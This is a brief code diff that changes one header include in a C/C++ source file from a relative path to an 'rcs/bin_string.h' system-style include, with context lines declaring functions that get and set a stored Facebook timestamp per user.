@@ -6,7 +6,7 @@
 #include "../../H4DLL/LOG.h"
 #include "SocialMain.h"
 #include "NetworkHandler.h"
-#include "../../H4DLL/bin_string.h"
+#include <rcs/bin_string.h>
 
 extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
 extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
